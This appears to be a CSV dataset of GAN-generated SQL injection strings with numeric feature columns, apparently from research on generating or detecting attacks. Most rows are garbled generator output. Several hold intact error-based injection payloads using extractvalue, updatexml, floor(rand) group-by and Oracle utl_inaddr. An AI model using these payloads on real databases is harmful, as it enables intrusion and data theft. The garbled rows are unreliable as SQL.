attack,"1%%59176||selk   h.T  (  (  0  0 (  ,    )   FROM   AND D end  8190  00x717a767a71select 0 else concat  ||cour FROM 0 R LIsus   (ex union information_schema.chr  (  select orx by select by when else   )    and))  case group FROMx U chr  (  benchmark  5305 and 3931x or where else )  )   )    2131       a  1 Aifromtsar.0x7171706a716055  ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57,350.0,50.0,4.520188927583659,165.0,60.0,100.0,25.0,0.4714285714285714,0.17142857142857143,0.2857142857142857,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,2.0,1.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,2.0,1.0,1.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""ANT7562  )    ||OWoysxnm",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58,224.0,37.0,3.571589993617091,57.0,35.0,101.0,31.0,0.2544642857142857,0.15625,0.45089285714285715,0.13839285714285715,0.0,2.0,1.0,0.0,1.0,1.0,0.0,19.0,0.0,0.0,4.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-7319122  )    from from   and   (  -  select end  6237,concat  4232  4232  )  ,concat  )    (  eb   106  then 6913  case information_schemaltnun   a5192mz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59,155.0,32.0,4.102319406204876,67.0,30.0,48.0,10.0,0.432258064516129,0.1935483870967742,0.3096774193548387,0.06451612903225806,0.0,0.0,2.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack, 1'||  (  select 'estNdresyuassutial,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60,36.0,17.0,3.784527696416556,24.0,1.0,6.0,5.0,0.6666666666666666,0.027777777777777776,0.16666666666666666,0.1388888888888889,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select '"" like ""ywT or 0x717a767a71havings   )    )   having group and1o.WHERE SNT M 9067 case union union  ||r  (  =  ||chr  ""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""  (    (  *2i2  ,  ||chr  (  )  ||chr  ahr  (  rand  (  0  ||chr  )  E =  4386  )   (  )     )        )    )   ) from 0 FROM ) cous c' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'E(  4232   )    a WHERESISIINUTU  (  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61,863.0,55.0,3.9804145885547615,275.0,107.0,355.0,126.0,0.3186558516801854,0.12398609501738123,0.41135573580533025,0.14600231749710313,4.0,4.0,0.0,0.0,1.0,6.0,0.0,68.0,0.0,3.0,6.0,39.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,2.0,1.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%%""  =  ""Tjhrosuaszuna6825s   )     (  select FROM x 3051  1 group whereIST 1 5584INThrys.seserr.gchrt  113  (  *2   *2   and113  9067|| 1 (  )  ,  select )  )        (  ||INM  ISELECT end   concat  (  select concat  6237,  =  )  4232   concat   =   )    select   (  thenchrount_  (  (  select group or 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62,305.0,51.0,4.335632251979249,132.0,37.0,104.0,32.0,0.43278688524590164,0.12131147540983607,0.34098360655737703,0.10491803278688525,0.0,2.0,0.0,0.0,2.0,3.0,0.0,14.0,2.0,1.0,2.0,9.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63,234.0,33.0,3.9188780898706512,81.0,45.0,83.0,25.0,0.34615384615384615,0.19230769230769232,0.3547008547008547,0.10683760683760683,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select 'yw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64,19.0,12.0,3.32110433057849,8.0,1.0,5.0,5.0,0.42105263157894735,0.05263157894736842,0.2631578947368421,0.2631578947368421,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  "">j4822t'+  (  select '  (  :r  =  )   WHERE s or )  )   )    (  8190,and  =  )   (  )    )     )    concat  SELECT  1 or DINSUNelsefzed_oysasyst  6237  )    )    )   j DINT  select D unionxx.rhrro.t_.ayguachr  (    6237,1 0 0  30519067and    1   x  )     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65,483.0,57.0,4.045889139730111,162.0,65.0,198.0,58.0,0.33540372670807456,0.13457556935817805,0.40993788819875776,0.12008281573498965,2.0,2.0,1.0,0.0,0.0,3.0,0.0,35.0,0.0,2.0,7.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'||  (  select '(t'etetuaint_r. 0 (  case  113   n x  t  rand  (  #  ||chrhr  ||chhro  (  select union4386  )    )   then or when  (  rand  ||chart_r.td_sh  (  (  havingchr  (  6055  select else 0 or 3931 from group and 0x717a767a71,concat  =  u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66,246.0,39.0,4.232639236683454,116.0,27.0,73.0,30.0,0.4715447154471545,0.10975609756097561,0.2967479674796748,0.12195121951219512,3.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,3.0,1.0,9.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1'||  (  select 'bqwap'  =  'b"" like ""u'  =  '""  =  ""axz,xssm8382   touasinformation_schemabl,floor  113  (  =  )     SELECT d FROM  FROM (  0x7171706a710x717a767a712,concat  jyr   *u2  ,  (  ||arochrowj_adr   (  selectchr  (  =  5023  '  a  (  ) I  *   (  4232        then    by u.)   SELECT else union information_schemast_  (  113    ,  case 0 else4386   then 1   from or  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67,379.0,54.0,4.527228416029117,165.0,46.0,123.0,45.0,0.43535620052770446,0.12137203166226913,0.3245382585751979,0.11873350923482849,7.0,4.0,0.0,0.0,2.0,5.0,0.0,13.0,0.0,4.0,5.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,-' 3051 end  || case -chr  (  *2   (  and)    or concat  c(  (  whenw_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68,70.0,24.0,3.653128043367364,27.0,5.0,26.0,12.0,0.38571428571428573,0.07142857142857142,0.37142857142857144,0.17142857142857143,1.0,0.0,2.0,0.0,1.0,0.0,0.0,5.0,0.0,1.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"13785w' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ed_r  (  5840  4386  concat  ).  ,concat  4232  ||chos  )      WHEREINFROM.I end  6082  ,0x717a767a71,,  #l(  (  ||m whenm   6270or 1 7158,concat  (  0  )  0 and AND L where 1  select whenm' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'  || 0 when 6082 1 else  3051 --   5023  case 7881 D AND 7158   (i||  106  *2   thenr  chr  (  =  )  #  || AS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69,971.0,57.0,4.228124045217198,319.0,204.0,339.0,109.0,0.32852729145211124,0.21009268795056643,0.349124613800206,0.11225540679711637,6.0,0.0,2.0,0.0,3.0,5.0,0.0,53.0,0.0,1.0,22.0,23.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,2.0,2.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,29.0
attack,"17864113  ||chr  =  0  ),concat  4232  )  aYW else c_r  ||cr  and  (  #  '||choh  =  )   RAT.CT  ,concat  select m   thenAby d =  6270     )   case 0 1  113  case    6913  select 3440   when   (  6237,0x717a767a71)  select when   (  0  )  )    ||      (  0  (  ,floor  rand  ,concat  )  ||chr  ||sI.case  113  )  ai,  (  select A",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70,329.0,44.0,4.013867593198039,117.0,48.0,123.0,41.0,0.3556231003039514,0.1458966565349544,0.3738601823708207,0.12462006079027356,1.0,0.0,0.0,0.0,0.0,3.0,0.0,15.0,0.0,1.0,6.0,15.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1-' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '2131wbk",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71,202.0,35.0,4.027316844749335,72.0,41.0,68.0,21.0,0.3564356435643564,0.20297029702970298,0.33663366336633666,0.10396039603960396,2.0,0.0,1.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'tr unionCconcat  (  (  )  , union from    then IEor1 DIT  (  6055,  (  rand  ||chr  (  ,' DIM when.(  113  caserand  =  )   from 4493  0 ,1  =  )    )     )   then concat  =  ,  =  ,0x717a767a71,1   then union where 6913  =  )  ||chr   axunel  )     2   from hr  (  )  ||chr  (  ||c  (  0    113  )     )  ,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72,309.0,40.0,3.8551070357568142,106.0,34.0,126.0,43.0,0.343042071197411,0.11003236245954692,0.4077669902912621,0.13915857605177995,2.0,0.0,0.0,0.0,0.0,5.0,0.0,19.0,0.0,0.0,8.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,2.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,-'||  (  select 'ksyocynw  randls,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73,33.0,18.0,3.8805646661291595,20.0,0.0,7.0,6.0,0.6060606060606061,0.0,0.21212121212121213,0.18181818181818182,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-S4poel'  =  'aYpo_(  =  select   --  )i   )   select x  1 end  )   4493   )    )       )         6825  )   SELECTx 3051 DI   from  (  ||u  (  )    ,and from from else -- 0 select x when.x  (  a I R and Uunion when  (  || 5305,floor0x717a767a71add  (  0 ,1 )  0   rand  (  ~  select from #varass.adrowes.erin",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74,308.0,51.0,4.231552056408185,125.0,31.0,114.0,38.0,0.40584415584415584,0.10064935064935066,0.37012987012987014,0.12337662337662338,2.0,0.0,5.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,3.0,11.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'tasw'  =  't when    selects   (  )      (  ,concat  )),  ||chr  (  113  )  case    8488 1   LIST FROMun   (  ||chr  (    4232  ||c  (  3440  =  4232  ,1   then =  having CAM '   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '  ||chr  select or else 0 4493  select  1 when   0x7171706a71 when where when  )  select   )  4232  x  )    )  =  rande else from RN from y  )  select 3326  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75,866.0,52.0,4.0011720814350555,299.0,136.0,339.0,92.0,0.34526558891454967,0.15704387990762125,0.39145496535796764,0.10623556581986143,6.0,0.0,0.0,0.0,2.0,6.0,0.0,55.0,0.0,0.0,14.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,11.0,3.0,1.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'hts chr  (  rand  )  select   (  thenchr  (r  =  )  )  )    fromuar or fromua  (  case union WHERE union 0 3074  )    )   (   and orx else cAND  >  =u,concat  case union AWHERE information_schemafouna' like 'leinias   and  rand  case   WHERE DNISST  (  ||ruabnatdtereas or end  )  ,,concat  select  1 when   (  9173c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76,525.0,50.0,4.040115349247641,231.0,41.0,199.0,54.0,0.44,0.07809523809523809,0.379047619047619,0.10285714285714286,4.0,0.0,0.0,0.0,1.0,3.0,0.0,34.0,0.0,1.0,7.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,3.0,2.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,"1'||  (  select 'e'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'adrzx.Txs   ||Cro'  =  'extx.s information_schemaT  (  )     and=   from r union floor  (  =  and (  )   )     )  )   6237u   ,  112  ) 1 7881 by concat  t  rand  9067  )  select DSINE  0  ||o  *     --,concat  ||=  (  )  select    select SSM 1210  SELECT else group by d  (  (  0 4232  ||chs group union 0 or 3440  ||chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77,542.0,53.0,4.24493021051153,214.0,68.0,195.0,65.0,0.3948339483394834,0.12546125461254612,0.35977859778597787,0.11992619926199262,6.0,0.0,2.0,0.0,1.0,5.0,0.0,29.0,0.0,1.0,7.0,20.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'selectfvvnesatys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78,244.0,31.0,3.7268590804477864,85.0,37.0,96.0,26.0,0.3483606557377049,0.15163934426229508,0.39344262295081966,0.10655737704918032,2.0,0.0,0.0,0.0,0.0,1.0,0.0,18.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'||  (  select '""  =  "".||cheschoutu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79,37.0,16.0,3.6408290408368487,16.0,1.0,9.0,11.0,0.43243243243243246,0.02702702702702703,0.24324324324324326,0.2972972972972973,2.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1hrjet_aseltys SM N 3785 1 concat  ||chr  6237(  casey where a else 4386  ||cr  (  )   then DISMIT(  )   and else 1 mi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80,118.0,35.0,4.286985033922601,60.0,15.0,33.0,10.0,0.5084745762711864,0.1271186440677966,0.2796610169491525,0.0847457627118644,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81,3.0,2.0,0.9182958340544896,0.0,1.0,2.0,0.0,0.0,0.3333333333333333,0.6666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '4838Tfloorx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82,308.0,38.0,4.045111058247985,108.0,59.0,109.0,32.0,0.35064935064935066,0.19155844155844157,0.3538961038961039,0.1038961038961039,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-78101210  selectCAMx.  )  caseIT  4232  )   6913  6825   when   (  #,||chhr  (  select from FROM auinas FROMtbt.ea  ul  =  ||chr  )     4493  6237,floor  (  case group group by having select union 1 4493   concat  ,1a end   )     SELECT Aunion 0x717a767a71  =  ,  (  6237)    )R     )    or union 3440  4232  x   from     (  113(w  ),1   (  ||ch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83,346.0,52.0,4.4183140259248495,137.0,59.0,118.0,32.0,0.3959537572254335,0.17052023121387283,0.34104046242774566,0.09248554913294797,0.0,0.0,1.0,0.0,0.0,2.0,0.0,15.0,0.0,0.0,5.0,9.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,2.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'j_er  a union1 6825  ende froma dr  113  ||ch  (  select  1x 1 5192 concathr  (  6237  =  (N",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84,439.0,38.0,3.8343924905321822,115.0,99.0,171.0,54.0,0.2619589977220957,0.2255125284738041,0.3895216400911162,0.12300683371298406,4.0,0.0,0.0,0.0,0.0,4.0,0.0,30.0,0.0,1.0,11.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'||  (  select 'yT1 (  6237,1   )     SELECT G 1 or # 1 e information_schemachtst_ronsyex.rNrosuad   )  ua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85,107.0,38.0,4.4782528257084,57.0,9.0,28.0,13.0,0.5327102803738317,0.08411214953271028,0.2616822429906542,0.12149532710280374,2.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,2.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
